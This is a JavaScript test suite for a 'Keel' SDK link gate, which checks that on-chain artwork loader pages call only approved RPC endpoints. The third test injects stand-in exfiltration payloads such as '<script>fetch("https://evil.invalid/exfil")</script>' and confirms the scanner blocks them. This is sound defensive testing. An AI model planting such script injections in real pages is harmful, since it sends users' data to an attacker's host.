import test from 'node:test';
import assert from 'node:assert/strict';
import {pathToFileURL} from 'node:url';
const base=process.env.KEEL_LINK_GATE_TEST_DIST?pathToFileURL(process.env.KEEL_LINK_GATE_TEST_DIST+'/'):new URL('../packages/sdk/dist/',import.meta.url);
const {buildKeelManagedShellLoader,isKeelGovernedManagedShellLoader}=await import(new URL('managed-shell-loader.js',base));
const {KEEL_MANAGED_SHELL_RUNTIME}=await import(new URL('managed-shell-runtime.js',base));
const {enforceKeelLinkGate,scanKeelLinkGate,loadKeelLinkGateInfrastructure}=await import(new URL('link-gate.js',base));
const input={chainId:11155111,store:'0x'+'11'.repeat(20),objectId:'0x'+'22'.repeat(32),digest:'0x'+'33'.repeat(32),rpcUrls:['https://ethereum-sepolia-rpc.publicnode.com'],rpcHosts:['publicnode.com']};
const encode=s=>Buffer.from(s);
const scan=html=>scanKeelLinkGate({route:'managed-loader-regression',resources:[{id:'managed',bytes:encode(html)}]});
const loader=buildKeelManagedShellLoader(input);
const marker='globalThis.__KEEL_MANAGED_SHELL__=';
function configChange(fn){const start=loader.indexOf(marker)+marker.length,end=loader.indexOf(';',start),config=JSON.parse(loader.slice(start,end));fn(config);return loader.slice(0,start)+JSON.stringify(config)+loader.slice(end)}

test('actual maintained runtime and complete governed loader pass without domain exemptions',async()=>{
 const infrastructure=await loadKeelLinkGateInfrastructure();
 assert.ok(infrastructure.find(i=>i.id==='keel.managed-shell-runtime').texts.includes(KEEL_MANAGED_SHELL_RUNTIME));
 assert.equal(scan(KEEL_MANAGED_SHELL_RUNTIME).status,'clear');
 for(const source of [loader,encodeURIComponent(loader),encodeURIComponent(encodeURIComponent(loader))]){
  const report=await enforceKeelLinkGate({route:'managed-loader-regression',resources:[{id:'managed',bytes:encode(source)}]});
  assert.equal(report.status,'clear');assert.deepEqual(report.coverage.uninspected,[]);
 }
 assert.equal(isKeelGovernedManagedShellLoader(loader),true);
 assert.equal(scan('fetch("https://ethereum-sepolia-rpc.publicnode.com/")').status,'blocked');
});

test('complete loader keeps manifest metadata as data and enforces bundled endpoint policy',async()=>{
 const {createKeelRpcReadManifest}=await import(new URL('rpc-read-manifest.js',base));
 const manifest=createKeelRpcReadManifest({chainId:11155111,rpcUrls:input.rpcUrls,revision:3});
 const complete=buildKeelManagedShellLoader({chainId:input.chainId,store:input.store,objectId:input.objectId,digest:input.digest,rpcManifest:manifest});
 assert.equal(isKeelGovernedManagedShellLoader(complete),true);assert.equal(scan(complete).status,'clear');
});

test('mutated runtime, config, foreign endpoints and sibling code cannot borrow loader authority',async()=>{
 await loadKeelLinkGateInfrastructure();
 const malicious='https://evil.invalid/exfil';
 const cases=[
  loader.replace('Loading onchain artwork','Changed onchain artwork'),
  loader.replace(KEEL_MANAGED_SHELL_RUNTIME.slice(0,30),KEEL_MANAGED_SHELL_RUNTIME.slice(0,30)+' '),
  buildKeelManagedShellLoader({...input,rpcUrls:[malicious],rpcHosts:['evil.invalid']}),
  configChange(c=>{c.unrecognized=true}),configChange(c=>{c.rpcHosts.push('evil.invalid')}),
  configChange(c=>{c.rpcUrls[0]='http://127.0.0.1:8545'}),
  configChange(c=>{c.maxConcurrentReads=0}),configChange(c=>{c.rpcManifestRevision=3}),
  loader+'<script>fetch("'+malicious+'")</script>',
  loader.replace('</body>','<script>fetch("'+malicious+'")</script></body>'),
 ];
 for(const source of cases){
  assert.equal(isKeelGovernedManagedShellLoader(source),false);
  for(const encoded of [source,encodeURIComponent(encodeURIComponent(source)),JSON.stringify({program:source})])assert.equal(scan(encoded).status,'blocked');
 }
});
